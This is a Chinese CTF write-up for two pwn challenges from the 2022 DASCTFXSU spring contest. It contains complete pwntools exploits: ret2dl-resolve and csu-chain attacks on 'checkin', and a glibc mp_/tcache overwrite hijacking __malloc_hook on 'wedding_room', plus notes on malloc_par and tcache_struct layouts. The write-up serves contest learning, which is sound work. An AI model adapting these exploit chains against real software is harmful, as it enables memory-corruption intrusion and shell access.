---
title: 2022 DASCTFXSU三月春季挑战赛 pwn Writeup
date: 2022-04-20 22:46:59 +0800
categories:
  - ctf比赛
tags:
  - pwn
  - ctf
permalink: /posts/id=12/
pin: false
published:
---
## checkin(ret2dl)

这道题在[ret2dl利用总结](https://blog.e4l4.com/posts/ret2dl总结/)这篇文章里做了详细分析，这里贴一下2种EXP

```python
from pwn import *
context(os='linux', arch='amd64', log_level='debug')
p = process('./checkin')
elf = ELF('./checkin')
libc = elf.libc

plt0 = elf.get_section_by_name('.plt').header.sh_addr
rop_addr = 0x404000 + 0x700
pop_rdi_ret = 0x401253
leave_ret= 0x4011e2
main_read = 0x4011bf

def create_fake_link_map_1(fake_addr, known_got, reloc_index, offset):
	target = fake_addr - 8 #the result you write in (any addr)
	fake_link_map = p64(offset & (2**64-1)) #l_addr
	fake_link_map = fake_link_map.ljust(0x30, b'\x00')
	fake_jmprel = p64(target-offset) #r_offset
	fake_jmprel += p64(7) #r_info
	fake_jmprel += p64(0) #r_append
	fake_link_map += fake_jmprel
	fake_link_map += b"/bin/sh\x00"
	fake_link_map = fake_link_map.ljust(0x58, b'\x00')
	return fake_link_map
def create_fake_link_map_2(fake_addr, known_got, reloc_index, offset):
	fake_link_map = p64(0) + p64(leave_ret)
	fake_link_map += p64(fake_addr) #l_info[5] dynstr
	fake_link_map += p64(fake_addr+0x78-8) #l_info[6] dynsym
	fake_link_map += p64(known_got-8) #dynmic symtabg
	fake_link_map += p64(fake_addr+0x30-0x18*reloc_index) #dynmic jmprel
	fake_link_map += b'\x00'*0x70
	return fake_link_map

fake_reloc_arg = 0 # just as one wishes
fake_link_map_addr = rop_addr + 0x48
fake_link_map_1 = create_fake_link_map_1(fake_link_map_addr, elf.got['read'],fake_reloc_arg, libc.sym['system'] - libc.sym['read'])
fake_link_map_2 = create_fake_link_map_2(fake_link_map_addr, elf.got['read'],fake_reloc_arg, libc.sym['system'] - libc.sym['read'])

# 栈迁移
payload= b'\x00'*0xa0 + p64(rop_addr+0xa0) + p64(main_read)
p.send(payload)

payload = p64(pop_rdi_ret) + p64(fake_link_map_addr+0x48)
payload += p64(plt0+6) + p64(fake_link_map_addr) + p64(fake_reloc_arg) +p64(0)*4 + fake_link_map_1
payload += p64(rop_addr+0xa0*2) + p64(main_read)# 0xb0
p.send(payload)

payload = fake_link_map_2 + p64(rop_addr+0xa0*3) + p64(main_read)# 0xb0
p.send(payload)

payload = p64(fake_link_map_addr+0x80-8) + p64(leave_ret) #l_info[23] jmprel
payload = payload.ljust(0xa0, b'\x00')
payload += p64(rop_addr - 0x8) + p64(leave_ret)
p.send(payload)
p.interactive()
```



```python
from pwn import *
context(os='linux', arch='amd64', log_level='debug')

p = process("./checkin")
elf =ELF('./checkin')
libc = elf.libc

# gdb.attach(p)
payload = b"a"*0xa0 + p64(0x4040c0+0xa0) + p64(0x4011BF)  #buf = 0x4040c0
p.send(payload)

payload = flat([  #csu
    0x404140,    #no use
    0x40124A,  # pop 6
    0,1,      #rbx rbp
    0x404040, # stdout  r12
    0,0,    # r13 r14
    0x404020,  #r15 setvbuf_got
    0x401230,  # ret 
    0,0,   #+8 rbx
    0x404140, #rbp
    0,0,0,0, #12 13 14 15
    0x4011BF #read = put
    ])
payload = payload.ljust(0xa0,b"\x00") + p64(0x404020+0xa0) + p64(0x4011bf) #read 
p.send(payload)
sleep(0.1)

p.send(b"\x50\xc4")
sleep(0.1)
libc_base = u64(p.recvuntil(b"\x7f")[-6:].ljust(8,"\x00")) -0x1ed6a0

success("libc_base:"+hex(libc_base))

p.send(b"a"*0xa0 +p64(libc_base+0xe3b2e)*2 ) 

p.interactive()
```


## wedding_room(mmap申请堆越界修改)

题目没有free，只有一个add和edit，主要利用申请大小无限制

![image-20220403111614976](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20220403111614976.png)

![image-20220403111647256](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20220403111647256.png)

泄露libc后，思路是去改mp使tcache引索越界，任意申请需要的堆。mp_+80一开始为0x40

![image-20220403110847336](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20220403110847336.png)

关于mp\_结构体，glibc的参数管理使用 struct malloc_par，全局拥有一个唯一的 malloc_par实例

```c
struct malloc_par
{
  /* Tunable parameters */
  unsigned long trim_threshold;    /* top chunk 的收缩阈值 */
  INTERNAL_SIZE_T top_pad;         /* 在分配内存时是否添加额外的 pad，默认该字段为 0 */
  INTERNAL_SIZE_T mmap_threshold;  /*  mmap 分配阈值 */
  INTERNAL_SIZE_T arena_test;      /* 当每个进程的分配区数量小于等于 arena_test 时，不会重用已有的分配区 */
  INTERNAL_SIZE_T arena_max;       /* 当系统中的分配区数量达到 arena_max，就不会再创建新的分配区，只会重用已有的分配区 */

  /* Memory map support */
  int n_mmaps;                     /* 当前进程使用 mmap()函数分配的内存块的个数 */
  int n_mmaps_max;                 /* mmap()函数分配的内存块的最大数量 */
  int max_n_mmaps;                 /* mmap()函数分配的内存块的数量的最大值 */
  /* the mmap_threshold is dynamic, until the user sets
     it manually, at which point we need to disable any
     dynamic behavior. */
  int no_dyn_threshold;            /* 否开启 mmap 分配阈值动态调整机制，默认值为 0，即开启 */

  /* Statistics */
  /* mmapped_mem 和 max_mmapped_mem 都用于统计 mmap 分配的内存大小，一般情况下两个字段的值相等 */
  INTERNAL_SIZE_T mmapped_mem;    
  INTERNAL_SIZE_T max_mmapped_mem;

  /* First address handed out by MORECORE/sbrk.  */
  char *sbrk_base;                  /* 堆的起始地址 */

#if USE_TCACHE
  /* Maximum number of buckets to use.  */
  size_t tcache_bins;              /* tcache bins 的数量 */
  size_t tcache_max_bytes;         /* 最大 tache 的大小 */
  /* Maximum number of chunks in each bucket.  */
  size_t tcache_count;             /* 每个 tcache bins 中tcaches 的最大数量 */
  /* Maximum number of chunks to remove from the unsorted list, which
     aren't used to prefill the cache.  */
  size_t tcache_unsorted_limit;
#endif
};
```
这里关于offsetidx的计算纠结了很久，方法就是（目标地址后三位-0x80）/8，再向前移动一位就行

这里(0xab0-0x80)/8=146 即0x1460，所以我们申请0x1450，然后再去布置好counts位

![image-20220403145939733](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20220403145939733.png)

![image-20220403150002719](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20220403150002719.png)

```python
from pwn import *
context(os='linux', arch='amd64', log_level='debug')
p = process('./wedding_room')
libc = ELF('./libc-2.31.so')

def add(size, length):
    p.sendlineafter(">> \n", '1')
    p.sendlineafter(">> \n", str(size))
    p.sendlineafter(">> \n", str(length))
def edit(index, content):
    p.sendlineafter(">> \n", '2')
    p.sendlineafter(">> \n", str(index))
    p.sendafter(">> \n", content)
def dbg():
    gdb.attach(p)
    pause()

# 修改stdout->write_ptr指针，让它比write_end小这样就能从end开始泄露
add(0x200000, 0x3ee6b8)
libc.address = u64(p.recvuntil("\x7f", timeout = 1)[-6:].ljust(8, b'\x00')) -0x1ee7e0
success("libc_base:\t" + hex(libc.address))
if (libc.address < 0):
    exit(-1)

# 修改mp结构体里的tcache bins的数量为1314
add(0x200000, 0x5ee2c0)

# 改topchunk大小，把oldtopchunk放入unsortbin，再申请一个largechunk
add(0x800, 0x809)
add(0x14000, 0x666) 
add(0x666, 0x666)
edit(4, p32(libc.sym['__malloc_hook'] & 0xffffff))#伪造mallochook地址
add(0x1450, 0x666)# 申请mallochook
edit(5, p64(libc.address + 0xe3b31))#one_gadget
p.sendlineafter(">> \n", b'1')
p.sendlineafter(">> \n", b'0')
p.interactive()
```

## tcache_struct结构

0x250的tcache_struct和0x290的大致相同，区别在于counts段一个大小占一个字节

![image-20220409223332707](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20220409223332707.png)

0x290的tcache_struct

![image-20220403180012397](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20220403180012397.png)

mp_的查找方法：

`p &mp_`